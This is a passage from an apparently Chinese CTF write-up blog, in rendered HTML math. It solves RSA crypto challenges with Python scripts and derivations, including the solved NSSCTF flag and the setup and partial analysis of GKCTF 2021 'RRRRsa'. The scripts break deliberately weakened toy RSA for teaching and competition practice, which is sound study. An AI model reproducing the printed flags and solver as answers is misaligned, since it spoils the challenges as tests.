mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>由二式可以得到k倍的n</p><p>q是一个比较小的数，我们可以直接爆破，然后求到kp</p><p>我们去在线网站进行分解，可以得到p</p><p>然后求解得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>最后根据威尔逊定理,我们对m0从p-q乘到p-1可以得到-m mod(p)</p><p>然后对-1求逆元就可以得到m</p><h2 id="exp-10"><a class="markdownIt-Anchor" href="#exp-10"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c2=<span class="hljs-number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span><br>c1=<span class="hljs-number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span><br>e=<span class="hljs-number">1049</span><br>kn=<span class="hljs-number">2</span>**<span class="hljs-number">1049</span>-c2<br><span class="hljs-string">&quot;&quot;&quot;for i in range(1&lt;&lt;15,1&lt;&lt;16):</span><br><span class="hljs-string">    if isPrime(i) and kn%i==0:</span><br><span class="hljs-string">        q=i</span><br><span class="hljs-string">        print(q)</span><br><span class="hljs-string">        print(kn//q)</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">        #34211</span><br><span class="hljs-string">        #176187289150514462046172630174700088525221325866312783639426750020851677271339945780081598171833449310803326466412109196489585032131454474980855474525268996498728189708770015967359856986040467410546755834813513311041394212977692161618099683277808044775858602607121850124014360450965062461065243304016148002474085</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>q=<span class="hljs-number">34211</span>    <br>p=<span class="hljs-number">170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e,p*q)==c2<br><br>m0=<span class="hljs-built_in">pow</span>(c1,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(p-q,p):<br>    m0=(m0*i)%p<br><span class="hljs-built_in">print</span>(long_to_bytes((<span class="hljs-built_in">int</span>(m0)*invert(-<span class="hljs-number">1</span>,p))%p))<br><span class="hljs-comment">#b&quot;flag&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;&quot;</span><br><span class="hljs-comment">#NSSCTF&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;</span><br></code></pre></td></tr></table></figure><h1 id="gkctf-2021rrrrsa"><a class="markdownIt-Anchor" href="#gkctf-2021rrrrsa"></a> [GKCTF 2021]RRRRsa</h1><h2 id="题目-11"><a class="markdownIt-Anchor" href="#题目-11"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd<br><br>flag = <span class="hljs-string">b&#x27;xxxxxxxxxxxxx&#x27;</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>m = bytes_to_long(flag)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c))<br><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>n1 = p1*q1<br>e1 = <span class="hljs-number">65537</span><br><span class="hljs-keyword">assert</span> gcd(e1,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)) == <span class="hljs-number">1</span><br>c1 = <span class="hljs-built_in">pow</span>(p,e1,n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(n1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c1))<br>hint1 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2020</span> * p1 + q1, <span class="hljs-number">202020</span>, n1)<br>hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2021</span> * p1 + <span class="hljs-number">212121</span>, q1, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint2))<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>q2 = getPrime(<span class="hljs-number">512</span>)<br>n2 = p2*q2<br>e2 = <span class="hljs-number">65537</span><br><span class="hljs-keyword">assert</span> gcd(e1,(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)) == <span class="hljs-number">1</span><br>c2 = <span class="hljs-built_in">pow</span>(q,e2,n2)<br>hint3 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2020</span> * p2 + <span class="hljs-number">2021</span> * q2, <span class="hljs-number">202020</span>, n2)<br>hint4 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2021</span> * p2 + <span class="hljs-number">2020</span> * q2, <span class="hljs-number">212121</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(n2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint3=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint3))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint4=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint4))<br><br><span class="hljs-comment">#c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758</span><br><span class="hljs-comment">#n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829</span><br><span class="hljs-comment">#c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569</span><br><span class="hljs-comment">#hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951</span><br><span class="hljs-comment">#hint2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270</span><br><span class="hljs-comment">#n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489</span><br><span class="hljs-comment">#c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004</span><br><span class="hljs-comment">#hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077</span><br><span class="hljs-comment">#hint4=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513</span><br></code></pre></td></tr></table></figure><h2 id="分析-11"><a class="markdownIt-Anchor" href="#分析-11"></a> 分析</h2><p>目的是求解加密flag的p和q</p><h3 id="求解p"><a class="markdownIt-Anchor" href="#求解p"></a> 求解p：</h3><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1=(2020*p_1+q_1)^{202020}\quad mod(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>∗</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>212121</mn><msup><mo stretchy="false">)</mo><msub><mi>q</mi><mn>1</mn></msub></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint2=(2021*p_1+212121)^{q_1}\quad mod(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>将二式都变成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>根据二项式定理，出了第一项外，其他项都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>都可以消掉</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mi>p</mi><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1=(2020*p)^{202020}\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>根据费马小定理有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>=</mo><mn>2021</mn><mo>∗</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>212121</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint2=2021*p_1+212121\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>凑一下项得：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>∗</mo><mn>202</mn><msup><mn>1</mn><mn>202020</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>∗</mo><mn>2020</mn><mo>∗</mo><msub><mi>p</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1*2021^{202020}=(2021*2020*p_1)^{202020}\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span 